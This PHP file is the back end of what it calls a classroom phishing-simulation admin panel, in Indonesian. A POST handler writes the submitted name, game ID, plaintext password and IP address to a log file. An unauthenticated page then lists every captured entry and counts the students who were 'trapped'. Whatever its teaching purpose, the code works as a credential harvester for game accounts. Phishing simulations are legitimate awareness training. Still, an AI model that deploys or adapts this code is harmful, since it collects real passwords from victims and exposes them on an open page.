<?php
// Vercel filesystem is read-only except /tmp
// Store data in /tmp/data.txt (ephemeral — resets on redeploy/cold start)
$storagePath = '/tmp/data.txt';

// ── Handle POST (form submission from main page) ──────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nama   = trim($_POST['nama']    ?? '');
    $gameId = trim($_POST['game_id'] ?? '');
    $pwd    = trim($_POST['pwd']     ?? '');
    $ip     = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

    if ($nama !== '' || $gameId !== '' || $pwd !== '') {
        $timestamp = date('Y-m-d H:i:s');
        $line = "Waktu: {$timestamp} | Nama: {$nama} | ID: {$gameId} | Pwd: {$pwd} | IP: {$ip}";
        file_put_contents($storagePath, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
    }

    header('Location: /?status=tersimpan');
    exit;
}

// ── Admin view: parse log ─────────────────────────────────────────────────
$entries = [];
$count   = 0;
if (file_exists($storagePath) && filesize($storagePath) > 0) {
    $lines   = file($storagePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $entries = array_reverse($lines);
    $count   = count($entries);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Statistik – Admin Panel Simulasi Phishing</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="bg-grid"></div>
    <div class="bg-glow bg-glow-1"></div>
    <div class="bg-glow bg-glow-2"></div>

    <main class="admin-page">
        <div class="admin-container animate-in">

            <p class="admin-notice">
                Halaman ini hanya untuk guru/instruktur untuk melihat statistik partisipasi siswa.
            </p>

            <!-- Stats Card -->
            <div class="stats-card">
                <div class="stats-left">
                    <span class="badge-total">Total Terjebak</span>
                    <div class="stats-count"><?= $count ?> Siswa</div>
                    <div class="stats-label">Siswa yang memasukkan data ke form phishing.</div>
                </div>
                <div class="stats-icon">📊</div>
            </div>

            <!-- Log Section -->
            <div class="log-section">
                <h2 class="log-title">Log Aktivitas Terakhir</h2>

                <?php if (empty($entries)): ?>
                    <p class="log-empty">Belum ada data tersimpan.</p>
                <?php else: ?>
                    <div class="log-list">
                        <?php foreach ($entries as $entry): ?>
                            <div class="log-entry"><?= htmlspecialchars($entry, ENT_QUOTES, 'UTF-8') ?></div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>

            <div style="text-align:center; margin-bottom: 40px;">
                <a href="/" class="btn-home">Kembali ke Beranda</a>
            </div>

        </div>
    </main>
</body>
</html>
